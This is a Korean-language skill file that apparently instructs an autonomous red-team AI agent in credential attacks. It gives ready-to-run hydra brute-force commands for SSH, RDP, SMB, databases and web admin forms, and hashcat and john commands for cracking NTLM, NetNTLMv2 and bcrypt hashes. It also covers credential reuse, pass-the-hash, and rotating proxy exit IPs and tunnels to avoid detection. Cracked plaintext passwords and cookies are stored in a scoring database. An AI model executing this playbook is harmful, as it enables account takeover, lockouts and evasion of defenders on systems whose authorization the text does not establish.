---
name: credential-attack
description: 자격 증명 공격: 온라인 약한 비밀번호 브루트포스(hydra)와 오프라인 해시 크랙(hashcat/john), SSH/FTP/RDP/SMB/데이터베이스/Web 관리자 페이지 커버
whenToUse: 로그인 엔트리(Web 관리자/SSH/FTP/RDP/SMB/MySQL/MSSQL/Redis)를 발견해 비밀번호를 시험해야 할 때, 또는 이미 해시/암호문을 확보해 평문을 복원해야 할 때
role: exploit
enabled: true
---

# 자격 증명 공격(온라인 브루트포스 + 오프라인 크랙)

레드팀에서 "계정 권한을 얻는" 가장 안정적인 두 경로 중 하나다(다른 하나는 설정/소스 유출로 평문을 얻는 것).
**이 스킬은 비밀번호를 시험해 알아내는 데까지만 담당한다**; 알아낸 뒤에는 반드시 스킬 `browser-automation` / `kimi-webbridge` 로
**실제 브라우저에서 한 번 로그인**해야 계정 권한을 얻은 것으로 인정한다(레드라인: 자격 증명만으로는 계정 획득이 아니다).

## 이 머신의 도구

| 도구 | 경로 | 버전 | 용도 |
| --- | --- | --- | --- |
| **hydra** | `/usr/bin/hydra` | 9.7 | 온라인 브루트포스, 50+ 프로토콜 커버 |
| **hashcat** | `/usr/bin/hashcat` | 7.1.2 | 오프라인 해시 크랙(GPU/CPU) |
| **john** | `/usr/sbin/john` | — | 오프라인 크랙(형식 자동 식별, 설정 간단) |

사전: `/usr/share/wordlists/`(`rockyou.txt` 포함, gunzip 필요), `/usr/share/seclists/Passwords/`.
**rockyou 가 없으면 먼저 압축을 푼다**: `sudo gunzip /usr/share/wordlists/rockyou.txt.gz`(권한이 필요하다. 없으면 seclists 의 것으로 바꾼다).

## 1. 온라인 브루트포스(hydra)

### 공통 문법
```bash
hydra -L users.txt -P pass.txt <protocol>://<target>[:port] [모듈 인자] -t <동시성> -f -o runs/hydra-<target>.txt
```
- `-L` 사용자 이름 사전 / `-l` 단일 사용자 이름; `-P` 비밀번호 사전 / `-p` 단일 비밀번호
- `-t` 동시성(**기본 16, 16 을 넘기지 않는다**. 대부분의 서비스가 계정을 잠그거나 IP 를 차단한다)
- `-f` 하나 맞으면 중단(계정이 잠기는 것을 피한다)
- `-o` `runs/` 로 출력(보고서 재현에 필요하다)
- `-V` 매 시도 표시(디버깅용. 실전에서는 켜지 않는다)

### 프로토콜별 예시
```bash
# SSH
hydra -L users.txt -P pass.txt ssh://10.0.0.5 -t 4 -f -o runs/hydra-ssh-10.0.0.5.txt

# RDP(주의: 동시성을 반드시 낮춘다. Windows 가 계정을 잠근다)
hydra -L users.txt -P pass.txt rdp://10.0.0.6 -t 2 -f -o runs/hydra-rdp-10.0.0.6.txt

# SMB
hydra -L users.txt -P pass.txt smb://10.0.0.7 -t 4 -f

# FTP
hydra -L users.txt -P pass.txt ftp://10.0.0.8 -t 6 -f

# MySQL
hydra -L users.txt -P pass.txt mysql://10.0.0.9 -t 4 -f

# MSSQL
hydra -L users.txt -P pass.txt mssql://10.0.0.10 -t 4 -f

# Web 폼 로그인(POST) — 가장 많이 쓴다
hydra -L users.txt -P pass.txt target.example.com http-post-form \
  "/admin/login.jsp:username=^USER^&password=^PASS^:F=아이디 또는 비밀번호 오류" -t 8 -f -o runs/hydra-web-admin.txt

# Web 폼(추가 헤더/HTTPS)
hydra -L users.txt -P pass.txt -s 443 -S target.example.com http-post-form \
  "/login:user=^USER^&pass=^PASS^:F=invalid:H=Cookie: JSESSIONID=xxx" -t 8 -f
```

### Web 폼 브루트포스의 성패 판정(핵심)
`http-post-form` 세 번째 구간 형식: `"<경로>:<POST 본문>:<실패 조건>"`, **실패 조건을 정확히 써야 한다**. 아니면 전량 오탐이 된다:
- `F=<실패 특징 문자열>`: 응답에 그 문자열이 나오면 **실패**(권장, 가장 안정적)
- `S=<성공 특징 문자열>`: 응답에 그 문자열이 나오면 **성공**(응답에 통일된 실패 문구가 없을 때 사용)
- 먼저 손으로 두 번 요청한다(틀린 비밀번호와 맞는 비밀번호를 각각 한 번, 또는 존재하지 않는 사용자와 비교)**특징 문자열이 유일한지 확인**한 뒤 브루트포스를 돌린다.
- 캡차 / 이미지 코드 / 슬라이더가 있으면 먼저 우회 가능성을 본다(고정 캡차, 캡차 미검증, 프런트엔드 검증). 우회가 되지 않으면 **무리하게 돌리지 않는다**(스킬 `browser-automation` 으로 제한된 횟수의 캡차 동반 시도가 가능하다). 다른 경로로 전환한다.

### 사전 우선순위(시간을 아끼는 핵심)
1. **표적 소형 사전**(적중률 최고): 기관명/브랜드/도메인/연도 조합. 예: `기관약칭@2026`, `Admin@123`, `<도메인>2026`.
   `redteam_asset_query` 의 title/기관 정보로 즉석에서 만든다.
2. **기본 비밀번호 사전**: 제품 기본 비밀번호(`admin/admin`, `tomcat/tomcat`, `weblogic/weblogic1`, `sa/sa`).
   nuclei 템플릿 `http/default-logins/`(307개)를 참고하고, **먼저 `redteam_poc_search`** 로 조회한다.
3. **흔한 약한 비밀번호 TOP**: `/usr/share/seclists/Passwords/Common-Credentials/` 아래의 10-million / top-100 등.
4. 범용 대형 사전(rockyou)은 맨 마지막——느리고 노이즈가 크다.

### 사용자 이름은 어디서 얻는가
- Web 관리자: 오류 메시지, JS 안의 기본 계정, 인터페이스가 돌려주는 `createBy`, 로그인 페이지 힌트, `robots.txt`, 직원 메일 앞부분;
- 디렉터리 브루트포스에서 `/admin` 이 나오면 먼저 `admin`, `administrator`, `system`, `test`, `guest` 를 시도한다;
- 자격 증명 하나를 얻었으면 **자격 증명 재사용**(아래 참조)으로 간다. 브루트포스보다 훨씬 빠르다.

## 2. 오프라인 크랙(hashcat / john)

해시/암호문(데이터베이스, 설정 파일, `/etc/shadow`, Web 애플리케이션 DB)을 확보했으면 오프라인으로 돌린다. **대상 측 트래픽이 발생하지 않아** 온라인 브루트포스보다 훨씬 안전하다.

```bash
# 1) 먼저 해시 형식을 식별한다
hashcat --identify hashes.txt

# 2) NTLM(Windows)
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt -O -w 3

# 3) NetNTLMv2(Responder 로 수집한 것)
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt

# 4) MD5 / SHA1(Web 애플리케이션 DB)
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 100 hashes.txt /usr/share/wordlists/rockyou.txt

# 5) bcrypt(WordPress / PHP)
hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt

# 6) 규칙 적용(규칙으로 사전을 10배로 늘린다. 가성비 최고)
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# 7) 마스크 브루트포스(비밀번호 정책을 알 때. 예: 8자리 숫자 + 대문자)
hashcat -m 1000 hashes.txt -a 3 '?u?l?l?l?l?d?d?d?d'
```

```bash
# john: 형식 식별이 편하다. 설정은 ~/.john/john.conf
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --show hashes.txt
```

**주의**: 이 머신에는 GPU 가 없을 수 있어 `hashcat` 이 CPU 로 돌면 느리다——규칙 + 소형 사전을 우선하고, 또는 해시를 `runs/` 에 저장해 나중에 처리한다;
**크랙에 몇 시간을 매달지 않는다**. 크랙이 되지 않으면 해시로 직접 공격한다(Pass-the-Hash, 스킬 `lateral-movement` 참조).

## 3. 자격 증명 재사용(브루트포스보다 훨씬 빠르다. 먼저 한다)

자격 증명 한 쌍을 얻었으면 **먼저 횡적으로 시도**한다. 다음 대상을 서둘러 브루트포스하지 않는다:
1. `redteam_credential_list` 로 보유 자격 증명(사용자 이름/비밀번호/출처)을 확인한다;
2. 같은 비밀번호로 시도: 동일 계열 다른 시스템, 다른 자산의 관리 콘솔, SSH/RDP/SMB/데이터베이스, VPN/배스천/운영 플랫폼;
3. 사용자 이름 규칙(`성.이름`, 사번, 메일 앞부분)과 알려진 비밀번호로 같은 시스템의 다른 사용자를 시도한다;
4. 해시 직접 재사용: PtH / Pass-the-Key(스킬 `lateral-movement`).

## 4. 규율과 경계(반드시 지킨다)

1. **먼저 DB 를 조회한다**: `redteam_credential_list` / `redteam_asset_query`——같은 엔트리를 중복 브루트포스하지 않는다(`blocked_count>0` 이면 이유를 먼저 본다).
2. **계정 잠금 위험**: Windows(RDP/SMB)와 OA/도메인 계정은 **엄격히 속도를 제한**한다: `-t 2`(Windows), `-t 4`(SSH/FTP),
   사전은 100건 규모를 넘기지 않는다; **같은 계정에서 연속 5회 실패하면 중단**하고 계정이나 대상을 바꾼다——계정을 잠그는 것은 엔트리를 파괴하는 것이다.
3. **같은 대상에서 누적 차단 3회를 넘으면 포기**한다(`redteam_asset_test` status=abandoned + blocked=true).
4. **노이즈 감소는 프록시로**: Web 폼 브루트포스는 스킬 `cn-proxy-pool` 로 출구 IP 를 바꾼다; 내부망 대상은 suo5 터널을 쓴다.
5. **내부망은 fscan 우선**: 내부망 대역의 약한 비밀번호 일괄 점검은 스킬 `fscan-intranet` 에 맡긴다(28종 서비스 일괄 브루트포스, 한 번에 결과).
   hydra 는 fscan 이 커버하지 않는 프로토콜이나 정밀 제어가 필요한 단일 지점에 쓴다.

## 5. 출력과 DB 기록(강제)

1. **적중할 때마다 즉시 `redteam_credential_add`**:
   - `username`, **평문을 `secret_value` 에 기록**(패널에 그대로 표시되어 언제든 재사용하기 좋다), `source`(`약한 비밀번호`/`기본 비밀번호`/`자격 증명 재사용`/`유출`/`오프라인 크랙`),
     `tool`(실제 명령 원문. 예: `hydra -L users.txt -P pass.txt ssh://10.0.0.5 -t 4 -f`), `secret_ref`(증거 파일 경로. 예: `runs/hydra-ssh-10.0.0.5.txt`).
2. **실제 로그인을 검증해야 점수를 기록한다**: Web 관리자는 `browser-automation` / `kimi-webbridge` 로 실제 한 번 로그인한다
   (로그인 페이지 열기 → 계정/비밀번호 입력 → 관리 화면 진입 확인 → 페이지 제목/메뉴/현재 사용자 이름 기록 → Cookie 수집 후 증거 저장) →
   `redteam_access_add`(`method=web-login`) → `redteam_score_hit`(`web-app` 10점 / `web-app` 20점,
   `evidence` 에 "자산|관리자 tomcat/Tomcat@2024" 처럼 쓴다).
   **로그인하지 못하면 `redteam_asset_test` 의 `test` 에 막힌 지점 한 줄을 기록**하고(해시 미크랙/2차 인증 필요/출발지 IP 제한/계정 비활성) 점수를 기록하지 않는다.
3. **계정 권한은 서비스 단위로 상한**: 같은 자산 같은 포트는 한 번만 점수로 센다. 관리자를 얻으면 그 서비스는 만점이다——같은 서비스에서 여러 계정으로 점수를 쌓지 않는다.
4. 핵심 동작마다 `redteam_chain_add`: `stage_code=internet`(또는 `internal`),
   `tool` 에 실제 명령, `result` 에 출력 요약(예: `ssh 10.0.0.5 에 root/Root@123 으로 로그인 성공, uid=0(root)`).
5. 해시 파일과 크랙 결과는 모두 `runs/` 에 둔다.
